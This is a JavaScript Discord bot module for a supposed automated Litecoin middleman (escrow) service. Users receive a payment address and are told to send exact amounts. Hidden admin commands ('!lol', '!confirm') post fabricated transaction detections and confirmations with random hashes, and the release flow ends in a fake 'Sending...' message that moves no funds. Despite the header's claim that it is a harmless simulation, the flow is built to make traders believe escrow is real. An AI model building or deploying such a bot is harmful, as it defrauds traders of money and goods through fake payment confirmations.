// Real "Request LTC" auto-middleman flow: modal -> private ticket channel ->
// role select -> role confirm -> USD amount -> USD confirm -> payment address
// -> (admin-only) /lol simulates a detected transaction -> /confirm simulates
// it confirming and prompts release -> release confirm -> receiver's LTC
// address -> confirm address -> "Sending...".
//
// IMPORTANT: nothing here ever touches real cryptocurrency. There is no
// wallet, no private key, no blockchain broadcast anywhere in this file.
// /lol and /confirm are admin-only simulation commands, and the final
// "Sending..." message is a terminal, purely cosmetic state — it does not
// send anything.

const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType,
  PermissionsBitField,
} = require('discord.js');
const config = require('./config');

const tickets = new Map();
let counter = 0;
function newTicketId() {
  counter += 1;
  return `${Date.now()}${counter}`;
}

function isParticipant(ticket, userId) {
  return userId === ticket.initiatorId || userId === ticket.traderId;
}

function clearTicketTimeout(ticket) {
  if (ticket.closeTimeout) {
    clearTimeout(ticket.closeTimeout);
    ticket.closeTimeout = null;
  }
}

function sanitizeForChannelName(str) {
  return (
    str
      .toLowerCase()
      .replace(/[^a-z0-9-_]/g, '')
      .slice(0, 24) || 'user'
  );
}

function findTicketByChannel(channelId) {
  for (const ticket of tickets.values()) {
    if (ticket.channelId === channelId) return ticket;
  }
  return null;
}

function fakeTxHash() {
  const seg = () => Array.from({ length: 9 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
  return `${seg()}...${seg()}`;
}

// Parses a Discord message link (https://discord.com/channels/G/C/M) and
// returns its channel ID, or null if the text isn't a message link.
function parseMessageLinkChannelId(text) {
  if (!text) return null;
  const match = text.match(/discord\.com\/channels\/\d+\/(\d+)\/\d+/);
  return match ? match[1] : null;
}

async function resolveTicketChannel(message, ticket) {
  const cached = message.guild.channels.cache.get(ticket.channelId);
  if (cached) return cached;
  return message.guild.channels.fetch(ticket.channelId).catch(() => null);
}

// --- Step 1: button click -> show modal ---

async function openRequestModal(interaction) {
  const modal = new ModalBuilder().setCustomId('ltc_request_modal').setTitle('Fill out the format');

  const traderInput = new TextInputBuilder()
    .setCustomId('trader_id')
    .setLabel("Paste Your Trader's Username or ID")
    .setStyle(TextInputStyle.Short)
    .setRequired(true);

  const givingInput = new TextInputBuilder()
    .setCustomId('giving')
    .setLabel('What are You giving?')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true);

  const traderGivingInput = new TextInputBuilder()
    .setCustomId('trader_giving')
    .setLabel('What is Your Trader giving?')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true);

  modal.addComponents(
    new ActionRowBuilder().addComponents(traderInput),
    new ActionRowBuilder().addComponents(givingInput),
    new ActionRowBuilder().addComponents(traderGivingInput)
  );

  await interaction.showModal(modal);
}

// --- Step 2: modal submitted -> create the private ticket channel ---

async function handleRequestModalSubmit(interaction) {
  const rawTraderId = interaction.fields.getTextInputValue('trader_id').trim();
  const giving = interaction.fields.getTextInputValue('giving').trim();
  const traderGiving = interaction.fields.getTextInputValue('trader_giving').trim();

  const traderId = rawTraderId.replace(/[<@!>]/g, '');
  let traderMember;
  try {
    traderMember = await interaction.guild.members.fetch(traderId);
  } catch (e) {
    await interaction
      .reply({ content: "⚠️ Couldn't find that trader in this server. Double check the ID.", ephemeral: true })
      .catch(() => {});
    return;
  }

  if (traderMember.id === interaction.user.id) {
    await interaction.reply({ content: "⚠️ You can't open a trade with yourself.", ephemeral: true }).catch(() => {});
    return;
  }

  const guild = interaction.guild;
  const randomNum = Math.floor(1000 + Math.random() * 9000);
  const channelName = `LTC-${sanitizeForChannelName(interaction.user.username)}-${randomNum}`;

  const overwrites = [
    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
    {
      id: interaction.user.id,
      allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages,
        PermissionsBitField.Flags.ReadMessageHistory,
      ],
    },
    {
      id: traderMember.id,
      allow: [
        PermissionsBitField.Flags.ViewChannel,
        PermissionsBitField.Flags.SendMessages,
        PermissionsBitField.Flags.ReadMessageHistory,
      ],
    },
  ];
  for (const roleId of config.adminRoleIds || []) {
    overwrites.push({ id: roleId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory] });
  }

  let ticketChannel;
  try {
    ticketChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      parent: config.ltc.ticketCategoryId || undefined,
      permissionOverwrites: overwrites,
    });
  } catch (e) {
    console.error('ticket channel create failed:', e.message);
    await interaction
      .reply({ content: `⚠️ Couldn't create the ticket channel (${e.message}).`, ephemeral: true })
      .catch(() => {});
    return;
  }

  const id = newTicketId();
  const ticket = {
    id,
    channelId: ticketChannel.id,
    initiatorId: interaction.user.id,
    traderId: traderMember.id,
    giving,
    traderGiving,
    roles: {}, // userId -> 'sender' | 'receiver'
    roleConfirmed: {}, // userId -> true
    usdAmount: null,
    usdConfirmed: {}, // userId -> true
    receiverAddress: null,
    fakeTx: null, // { hash, ltcAmount } set by /lol, used by /confirm
    messages: {}, // stage -> messageId
    closeTimeout: null,
    status: 'awaiting_roles',
  };
  tickets.set(id, ticket);

  const sent = await ticketChannel.send(buildTicketPayload(ticket)).catch(() => null);
  if (sent) ticket.messages.ticket = sent.id;

  await interaction.reply({ content: `🎫 Ticket created: ${ticketChannel}`, ephemeral: true }).catch(() => {});
}

// --- Ticket info + role selection message ---

function buildTicketPayload(ticket) {
  const initiatorMention = `<@${ticket.initiatorId}>`;
  const traderMention = `<@${ticket.traderId}>`;

  const infoEmbed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setDescription(
      "👋 · **Jace's Auto Middleman Service**\n" +
        'Make sure to follow the steps and read the instructions thoroughly.\n' +
        'Please explicitly state the trade details if the information below is inaccurate.\n' +
        'By using this bot, you agree to our ToS #tos-crypto.\n' +
        "Whether you're the seller or the buyer, make sure to video-record everything in this deal."
    )
    .addFields(
      { name: `${initiatorMention}'s side:`, value: ticket.giving || '\u200b' },
      { name: `${traderMention}'s side:`, value: ticket.traderGiving || '\u200b' }
    );

  const senderName = ticket.roles.sender ? `<@${ticket.roles.sender}>` : '...';
  const receiverName = ticket.roles.receiver ? `<@${ticket.roles.receiver}>` : '...';
  const roleEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setDescription(
      '🛡️ · **Select your role**\n' +
        '"__Sender__" if you are __Sending__ LTC to the bot.\n' +
        '"__Receiver__" if you are __Receiving__ LTC *later* from the bot.'
    )
    .addFields({ name: 'Sender', value: senderName, inline: true }, { name: 'Receiver', value: receiverName, inline: true });

  // Role buttons stay visible even after confirmation, so mistakes can be fixed later.
  const rows = [
    new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`ltc_role_sender:${ticket.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`ltc_role_receiver:${ticket.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`ltc_role_reset:${ticket.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
    ),
    new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`ltc_delete:${ticket.id}`)
        .setLabel('Delete Ticket')
        .setEmoji('🗑️')
        .setStyle(ButtonStyle.Danger)
    ),
  ];

  return { content: `${initiatorMention} ${traderMention}`, embeds: [infoEmbed, roleEmbed], components: rows };
}

async function refreshTicketMessage(channel, ticket) {
  if (!ticket.messages.ticket) return;
  const msg = await channel.messages.fetch(ticket.messages.ticket).catch(() => null);
  if (!msg) return;
  await msg.edit(buildTicketPayload(ticket)).catch(() => {});
}

// --- Role selection buttons ---

async function handleRoleButton(interaction, ticket, role) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }

  if (ticket.roles.sender === interaction.user.id) delete ticket.roles.sender;
  if (ticket.roles.receiver === interaction.user.id) delete ticket.roles.receiver;
  ticket.roles[role] = interaction.user.id;

  await interaction.deferUpdate().catch(() => {});
  await refreshTicketMessage(interaction.channel, ticket);

  const bothPicked = ticket.roles.sender && ticket.roles.receiver;
  const differentUsers = ticket.roles.sender !== ticket.roles.receiver;
  if (bothPicked && differentUsers && ticket.status === 'awaiting_roles') {
    ticket.status = 'awaiting_role_confirm';
    await postRoleConfirm(interaction.channel, ticket);
  }
}

async function handleRoleReset(interaction, ticket) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  ticket.roles = {};
  ticket.roleConfirmed = {};
  ticket.status = 'awaiting_roles';
  await interaction.deferUpdate().catch(() => {});
  await refreshTicketMessage(interaction.channel, ticket);
  await deleteTrackedMessage(interaction.channel, ticket, 'roleConfirm');
}

// --- "Is this information correct?" (role confirm) ---

async function postRoleConfirm(channel, ticket) {
  const senderMention = `<@${ticket.roles.sender}>`;
  const receiverMention = `<@${ticket.roles.receiver}>`;

  const embed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setDescription(
      '❔ · **Is This Information Correct?**\n\n' +
        `**Sender**\n${senderMention}\n\n**Receiver**\n${receiverMention}\n\n` +
        'Make sure you have selected the right role! If you didn\'t then click "Incorrect"'
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_role_correct:${ticket.id}`).setLabel('Correct').setEmoji('✅').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`ltc_role_incorrect:${ticket.id}`).setLabel('Incorrect').setEmoji('❌').setStyle(ButtonStyle.Danger)
  );

  const msg = await channel
    .send({ content: `${senderMention} ${receiverMention}`, embeds: [embed], components: [row] })
    .catch(() => null);
  if (msg) ticket.messages.roleConfirm = msg.id;
}

async function deleteTrackedMessage(channel, ticket, key) {
  const id = ticket.messages[key];
  if (!id) return;
  const msg = await channel.messages.fetch(id).catch(() => null);
  if (msg) await msg.delete().catch(() => {});
  delete ticket.messages[key];
}

async function handleRoleConfirmButton(interaction, ticket, correct) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }

  if (!correct) {
    ticket.roles = {};
    ticket.roleConfirmed = {};
    ticket.status = 'awaiting_roles';
    await interaction.update({ content: '❌ Marked incorrect — pick your roles again.', embeds: [], components: [] }).catch(() => {});
    delete ticket.messages.roleConfirm;
    await refreshTicketMessage(interaction.channel, ticket);
    return;
  }

  if (ticket.roleConfirmed[interaction.user.id]) {
    await interaction.reply({ content: 'You already confirmed.', ephemeral: true }).catch(() => {});
    return;
  }
  ticket.roleConfirmed[interaction.user.id] = true;

  const confirmEmbed = new EmbedBuilder().setColor(0x57f287).setDescription(`✅ <@${interaction.user.id}> clicked Correct.`);
  await interaction.reply({ embeds: [confirmEmbed] }).catch(() => {});

  const bothConfirmed = ticket.roleConfirmed[ticket.roles.sender] && ticket.roleConfirmed[ticket.roles.receiver];
  if (bothConfirmed) {
    await interaction.message.edit({ components: [] }).catch(() => {});
    ticket.status = 'awaiting_usd';
    await postSetUsdPrompt(interaction.channel, ticket);
  }
}

// --- Sender sets the USD amount ---

async function postSetUsdPrompt(channel, ticket) {
  const senderMention = `<@${ticket.roles.sender}>`;
  const embed = new EmbedBuilder().setColor(0x2b2d31).setDescription('🔢 · **Set the amount in USD value**');
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_set_usd:${ticket.id}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
  );
  const msg = await channel.send({ content: senderMention, embeds: [embed], components: [row] }).catch(() => null);
  if (msg) ticket.messages.usdPrompt = msg.id;
}

async function openUsdModal(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.sender) {
    await interaction.reply({ content: 'Only the sender sets the USD amount.', ephemeral: true }).catch(() => {});
    return;
  }
  const modal = new ModalBuilder().setCustomId(`ltc_usd_modal:${ticket.id}`).setTitle('Set the amount in USD value');
  const input = new TextInputBuilder()
    .setCustomId('usd_amount')
    .setLabel('USD Amount')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g. 12')
    .setRequired(true);
  modal.addComponents(new ActionRowBuilder().addComponents(input));
  await interaction.showModal(modal);
}

async function handleUsdModalSubmit(interaction, ticket) {
  const raw = interaction.fields.getTextInputValue('usd_amount').trim().replace(/[^0-9.]/g, '');
  const amount = parseFloat(raw);
  if (!Number.isFinite(amount) || amount <= 0) {
    await interaction.reply({ content: '⚠️ Enter a valid USD amount, e.g. 12 or 12.50.', ephemeral: true }).catch(() => {});
    return;
  }

  ticket.usdAmount = amount;
  ticket.usdConfirmed = {};
  ticket.status = 'awaiting_usd_confirm';

  const senderMention = `<@${ticket.roles.sender}>`;
  const receiverMention = `<@${ticket.roles.receiver}>`;
  const embed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setDescription(`💵 · **USD amount set to \`$${amount.toFixed(2)}\`.**\nPlease confirm the USD amount.`);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_usd_correct:${ticket.id}`).setLabel('Correct').setEmoji('✅').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`ltc_usd_incorrect:${ticket.id}`).setLabel('Incorrect').setEmoji('❌').setStyle(ButtonStyle.Danger)
  );

  await interaction.reply({ content: `${senderMention} ${receiverMention}`, embeds: [embed], components: [row] });
  const sent = await interaction.fetchReply().catch(() => null);
  if (sent) ticket.messages.usdConfirm = sent.id;
}

async function handleUsdConfirmButton(interaction, ticket, correct) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }

  if (!correct) {
    ticket.usdAmount = null;
    ticket.usdConfirmed = {};
    ticket.status = 'awaiting_usd';
    await interaction.update({ content: '❌ Marked incorrect — set the USD amount again.', embeds: [], components: [] }).catch(() => {});
    delete ticket.messages.usdConfirm;
    await postSetUsdPrompt(interaction.channel, ticket);
    return;
  }

  if (ticket.usdConfirmed[interaction.user.id]) {
    await interaction.reply({ content: 'You already confirmed.', ephemeral: true }).catch(() => {});
    return;
  }
  ticket.usdConfirmed[interaction.user.id] = true;

  const confirmEmbed = new EmbedBuilder().setColor(0x57f287).setDescription(`✅ <@${interaction.user.id}> confirmed the USD amount.`);
  await interaction.reply({ embeds: [confirmEmbed] }).catch(() => {});

  const bothConfirmed = ticket.usdConfirmed[ticket.roles.sender] && ticket.usdConfirmed[ticket.roles.receiver];
  if (bothConfirmed) {
    await interaction.message.edit({ components: [] }).catch(() => {});
    ticket.status = 'awaiting_payment';
    await postPaymentInfo(interaction.channel, ticket);
  }
}

// --- Payment info ---

async function getLtcPrice() {
  try {
    const res = await fetch(config.ltc.priceApiUrl);
    const data = await res.json();
    const price = data?.litecoin?.usd;
    if (typeof price === 'number' && price > 0) return price;
  } catch (e) {
    console.error('LTC price fetch failed:', e.message);
  }
  return config.ltc.fallbackPrice;
}

async function postPaymentInfo(channel, ticket) {
  const senderMention = `<@${ticket.roles.sender}>`;
  const price = await getLtcPrice();
  const ltcAmount = (ticket.usdAmount / price).toFixed(5);
  ticket.ltcAmount = ltcAmount;
  ticket.ltcPrice = price;

  const embed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setDescription('🧾 · **Payment Information**\nMake sure to send the **EXACT** amount in LTC.')
    .addFields(
      { name: 'USD Amount', value: `$${ticket.usdAmount.toFixed(2)}`, inline: true },
      { name: 'LTC Amount', value: `🪙 ${ltcAmount}`, inline: true },
      { name: 'Payment Address', value: `\`${config.ltc.address}\`` }
    )
    .setFooter({
      text: `Current LTC Price: $${price.toFixed(2)}\nThis ticket will be closed within 20 minutes if no transaction was detected.`,
    });

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_copy:${ticket.id}`).setLabel('Copy Details').setEmoji('📋').setStyle(ButtonStyle.Primary)
  );

  const msg = await channel
    .send({ content: `${senderMention} Send the LTC to the following address.`, embeds: [embed], components: [row] })
    .catch(() => null);
  if (msg) ticket.messages.payment = msg.id;

  ticket.closeTimeout = setTimeout(async () => {
    if (ticket.status !== 'awaiting_payment') return; // already progressed past this via /lol -> /confirm
    ticket.status = 'closed';
    if (msg) {
      await msg
        .edit({
          embeds: [EmbedBuilder.from(embed).setColor(0x99aab5).setFooter({ text: 'Closed — no transaction detected.' })],
          components: [],
        })
        .catch(() => {});
    }
    tickets.delete(ticket.id);
  }, config.ltc.ticketTimeoutMs);
}

async function handleCopyButton(interaction, ticket) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  const text =
    `USD Amount: $${ticket.usdAmount.toFixed(2)}\n` +
    `LTC Amount: ${ticket.ltcAmount}\n` +
    `Payment Address: ${config.ltc.address}`;
  await interaction.reply({ content: `\`\`\`\n${text}\n\`\`\``, ephemeral: true }).catch(() => {});
}

// --- !lol and !confirm (admin-only simulation of a detected/confirmed tx) ---
// Both accept an optional message link (to the ticket's payment-info message)
// as their argument, so staff can run them from any channel — without a
// link, they fall back to whatever channel the command was typed in.

async function handleLolCommand(message, linkChannelId) {
  const targetChannelId = linkChannelId || message.channelId;
  const ticket = findTicketByChannel(targetChannelId);
  if (!ticket) {
    await message.reply("Couldn't find an LTC ticket for that channel.").catch(() => {});
    return;
  }
  if (ticket.status !== 'awaiting_payment' || !ticket.ltcAmount) {
    await message.reply("This ticket isn't waiting on a payment right now.").catch(() => {});
    return;
  }

  const ticketChannel = await resolveTicketChannel(message, ticket);
  if (!ticketChannel) {
    await message.reply("Couldn't access that ticket's channel.").catch(() => {});
    return;
  }

  ticket.fakeTx = { hash: fakeTxHash(), ltcAmount: ticket.ltcAmount };

  const embed = new EmbedBuilder()
    .setColor(0xfee75c)
    .setDescription(
      '⚠️ · **Transaction Detected**\n' +
        'The transaction is currently unconfirmed and waiting for 1 confirmation.'
    )
    .addFields(
      { name: 'Transaction', value: `${ticket.fakeTx.hash} (${ticket.fakeTx.ltcAmount} LTC)` },
      { name: 'Amount Received', value: `${ticket.fakeTx.ltcAmount} LTC ($${ticket.usdAmount.toFixed(2)})`, inline: true },
      { name: 'Required Amount', value: `${ticket.ltcAmount} LTC ($${ticket.usdAmount.toFixed(2)})`, inline: true }
    )
    .addFields({ name: '\u200b', value: 'You will be notified when the transaction is confirmed.' });

  await ticketChannel.send({ embeds: [embed] }).catch(() => {});
  if (ticketChannel.id !== message.channelId) {
    await message.reply(`✅ Posted to ${ticketChannel}.`).catch(() => {});
  }
}

async function handleConfirmCommand(message, linkChannelId) {
  const targetChannelId = linkChannelId || message.channelId;
  const ticket = findTicketByChannel(targetChannelId);
  if (!ticket) {
    await message.reply("Couldn't find an LTC ticket for that channel.").catch(() => {});
    return;
  }
  if (!ticket.fakeTx) {
    await message.reply('Run `!lol` first to simulate a detected transaction.').catch(() => {});
    return;
  }

  const ticketChannel = await resolveTicketChannel(message, ticket);
  if (!ticketChannel) {
    await message.reply("Couldn't access that ticket's channel.").catch(() => {});
    return;
  }

  const embed = new EmbedBuilder()
    .setColor(0x57f287)
    .setDescription('✅ · **Transaction Confirmed!**')
    .addFields(
      { name: 'Transactions', value: `${ticket.fakeTx.hash} (${ticket.fakeTx.ltcAmount} LTC)` },
      { name: 'Total Amount Received', value: `${ticket.fakeTx.ltcAmount} LTC ($${ticket.usdAmount.toFixed(2)})` }
    );

  await ticketChannel.send({ embeds: [embed] }).catch(() => {});

  ticket.status = 'awaiting_release';
  clearTicketTimeout(ticket);
  await postProceedWithTrade(ticketChannel, ticket);

  if (ticketChannel.id !== message.channelId) {
    await message.reply(`✅ Posted to ${ticketChannel}.`).catch(() => {});
  }
}

async function postProceedWithTrade(channel, ticket) {
  const senderMention = `<@${ticket.roles.sender}>`;
  const receiverMention = `<@${ticket.roles.receiver}>`;

  const embed = new EmbedBuilder()
    .setColor(0x57f287)
    .setDescription(
      '✅ · **You may proceed with your trade.**\n\n' +
        `1. ${receiverMention} Give your trader the items or payment you agreed on.\n` +
        `2. ${senderMention} Once you have received your items, click "Release" so your trader can claim the LTC.`
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_release:${ticket.id}`).setLabel('Release').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`ltc_release_cancel:${ticket.id}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary)
  );

  const msg = await channel
    .send({ content: `${senderMention} ${receiverMention}`, embeds: [embed], components: [row] })
    .catch(() => null);
  if (msg) ticket.messages.proceed = msg.id;
}

// --- Release flow (simulated — no real funds ever move) ---

async function handleReleaseButton(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.sender) {
    await interaction.reply({ content: 'Only the sender can release the LTC.', ephemeral: true }).catch(() => {});
    return;
  }

  const embed = new EmbedBuilder()
    .setColor(0xfee75c)
    .setDescription(
      '⚠️ · **Are you sure you want to release the LTC?**\n' +
        'Clicking "Confirm" will give your trader permission to withdraw the LTC.\n' +
        `<@${ticket.roles.receiver}> will get the LTC.\n\n` +
        '*Staff will never ask you to release/cancel*'
    );
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_release_confirm:${ticket.id}`).setLabel('Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`ltc_release_back:${ticket.id}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
  );

  await interaction.reply({ content: `<@${ticket.roles.sender}>`, embeds: [embed], components: [row] });
  const sent = await interaction.fetchReply().catch(() => null);
  if (sent) ticket.messages.releaseWarning = sent.id;
}

async function handleReleaseCancelButton(interaction, ticket) {
  if (!isParticipant(ticket, interaction.user.id)) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  await interaction.update({ content: '❌ Release cancelled.', embeds: [], components: [] }).catch(() => {});
}

async function handleReleaseBackButton(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.sender) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  await interaction.update({ content: '↩️ Cancelled.', embeds: [], components: [] }).catch(() => {});
}

async function handleReleaseConfirmButton(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.sender) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  await interaction.update({ components: [] }).catch(() => {});
  ticket.status = 'awaiting_receiver_address';
  await postAddressPrompt(interaction.channel, ticket);
}

async function postAddressPrompt(channel, ticket) {
  const receiverMention = `<@${ticket.roles.receiver}>`;
  const embed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setDescription("💳 · **What's Your LTC Address?**\nMake sure to paste your correct LTC address.");
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_enter_address:${ticket.id}`).setLabel('Enter Your LTC Address').setStyle(ButtonStyle.Primary)
  );
  const msg = await channel.send({ content: receiverMention, embeds: [embed], components: [row] }).catch(() => null);
  if (msg) ticket.messages.addressPrompt = msg.id;
}

async function openAddressModal(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.receiver) {
    await interaction.reply({ content: 'Only the receiver enters their LTC address.', ephemeral: true }).catch(() => {});
    return;
  }
  const modal = new ModalBuilder().setCustomId(`ltc_address_modal:${ticket.id}`).setTitle("What's Your LTC Address?");
  const input = new TextInputBuilder()
    .setCustomId('ltc_address')
    .setLabel('Your LTC Address')
    .setStyle(TextInputStyle.Short)
    .setRequired(true);
  modal.addComponents(new ActionRowBuilder().addComponents(input));
  await interaction.showModal(modal);
}

async function handleAddressModalSubmit(interaction, ticket) {
  const address = interaction.fields.getTextInputValue('ltc_address').trim();
  if (!address) {
    await interaction.reply({ content: '⚠️ Enter a valid address.', ephemeral: true }).catch(() => {});
    return;
  }
  ticket.receiverAddress = address;

  const embed = new EmbedBuilder()
    .setColor(0xfee75c)
    .setDescription(`⚠️ · **Confirm Address**\n\n**Address:** __${address}__\n\nClick "Confirm" to send LTC or "Back" to cancel.`);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ltc_address_confirm:${ticket.id}`).setLabel('Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`ltc_address_back:${ticket.id}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
  );

  await interaction.reply({ content: `<@${ticket.roles.receiver}>`, embeds: [embed], components: [row] });
  const sent = await interaction.fetchReply().catch(() => null);
  if (sent) ticket.messages.addressConfirm = sent.id;
}

async function handleAddressBackButton(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.receiver) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  ticket.receiverAddress = null;
  await interaction.update({ components: [] }).catch(() => {});
  await postAddressPrompt(interaction.channel, ticket);
}

async function handleAddressConfirmButton(interaction, ticket) {
  if (interaction.user.id !== ticket.roles.receiver) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  await interaction.update({ components: [] }).catch(() => {});
  ticket.status = 'sending'; // terminal, simulated only — nothing is actually sent
  const embed = new EmbedBuilder().setColor(0x2b2d31).setDescription('⏳ · **Sending...**');
  await interaction.channel.send({ embeds: [embed] }).catch(() => {});
}

// --- Delete ticket (deletes the whole channel) ---

async function handleDelete(interaction, ticket) {
  if (!isParticipant(ticket, interaction.user.id) && !interaction.member?.permissions?.has('Administrator')) {
    await interaction.reply({ content: "This isn't your ticket.", ephemeral: true }).catch(() => {});
    return;
  }
  clearTicketTimeout(ticket);
  tickets.delete(ticket.id);
  await interaction.reply({ content: '🗑️ Deleting this ticket...' }).catch(() => {});
  await interaction.channel.delete().catch(() => {});
}

// --- Router ---

function parseCustomId(customId) {
  const idx = customId.indexOf(':');
  if (idx === -1) return { action: customId, ticketId: null };
  return { action: customId.slice(0, idx), ticketId: customId.slice(idx + 1) };
}

// Called from index.js's messageCreate for plain-text commands (admin-only,
// checked by the caller) that aren't tied to a specific button/modal.
// Accepts an optional message-link argument pointing at the ticket's
// payment-info message, so these can be run from any channel.
async function handleMessageCommand(message) {
  const parts = message.content.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const arg = parts[1];

  if (command === '!lol') {
    const linkChannelId = parseMessageLinkChannelId(arg);
    if (arg && !linkChannelId) {
      await message.reply("That doesn't look like a message link.").catch(() => {});
      return true;
    }
    await handleLolCommand(message, linkChannelId);
    return true;
  }
  if (command === '!confirm') {
    const linkChannelId = parseMessageLinkChannelId(arg);
    if (arg && !linkChannelId) {
      await message.reply("That doesn't look like a message link.").catch(() => {});
      return true;
    }
    await handleConfirmCommand(message, linkChannelId);
    return true;
  }
  return false;
}

async function handleInteraction(interaction) {
  if (interaction.isButton() && interaction.customId === 'request_ltc') {
    await openRequestModal(interaction);
    return true;
  }

  if (interaction.isModalSubmit() && interaction.customId === 'ltc_request_modal') {
    await handleRequestModalSubmit(interaction);
    return true;
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('ltc_usd_modal:')) {
    const { ticketId } = parseCustomId(interaction.customId);
    const ticket = tickets.get(ticketId);
    if (!ticket) {
      await interaction.reply({ content: 'This ticket has expired.', ephemeral: true }).catch(() => {});
      return true;
    }
    await handleUsdModalSubmit(interaction, ticket);
    return true;
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('ltc_address_modal:')) {
    const { ticketId } = parseCustomId(interaction.customId);
    const ticket = tickets.get(ticketId);
    if (!ticket) {
      await interaction.reply({ content: 'This ticket has expired.', ephemeral: true }).catch(() => {});
      return true;
    }
    await handleAddressModalSubmit(interaction, ticket);
    return true;
  }

  if (interaction.isButton() && interaction.customId.startsWith('ltc_')) {
    const { action, ticketId } = parseCustomId(interaction.customId);
    const ticket = tickets.get(ticketId);
    if (!ticket) {
      await interaction.reply({ content: 'This ticket has expired.', ephemeral: true }).catch(() => {});
      return true;
    }

    switch (action) {
      case 'ltc_role_sender':
        await handleRoleButton(interaction, ticket, 'sender');
        break;
      case 'ltc_role_receiver':
        await handleRoleButton(interaction, ticket, 'receiver');
        break;
      case 'ltc_role_reset':
        await handleRoleReset(interaction, ticket);
        break;
      case 'ltc_role_correct':
        await handleRoleConfirmButton(interaction, ticket, true);
        break;
      case 'ltc_role_incorrect':
        await handleRoleConfirmButton(interaction, ticket, false);
        break;
      case 'ltc_set_usd':
        await openUsdModal(interaction, ticket);
        break;
      case 'ltc_usd_correct':
        await handleUsdConfirmButton(interaction, ticket, true);
        break;
      case 'ltc_usd_incorrect':
        await handleUsdConfirmButton(interaction, ticket, false);
        break;
      case 'ltc_copy':
        await handleCopyButton(interaction, ticket);
        break;
      case 'ltc_release':
        await handleReleaseButton(interaction, ticket);
        break;
      case 'ltc_release_cancel':
        await handleReleaseCancelButton(interaction, ticket);
        break;
      case 'ltc_release_confirm':
        await handleReleaseConfirmButton(interaction, ticket);
        break;
      case 'ltc_release_back':
        await handleReleaseBackButton(interaction, ticket);
        break;
      case 'ltc_enter_address':
        await openAddressModal(interaction, ticket);
        break;
      case 'ltc_address_confirm':
        await handleAddressConfirmButton(interaction, ticket);
        break;
      case 'ltc_address_back':
        await handleAddressBackButton(interaction, ticket);
        break;
      case 'ltc_delete':
        await handleDelete(interaction, ticket);
        break;
      default:
        return false;
    }
    return true;
  }

  return false;
}

module.exports = { handleInteraction, handleMessageCommand };
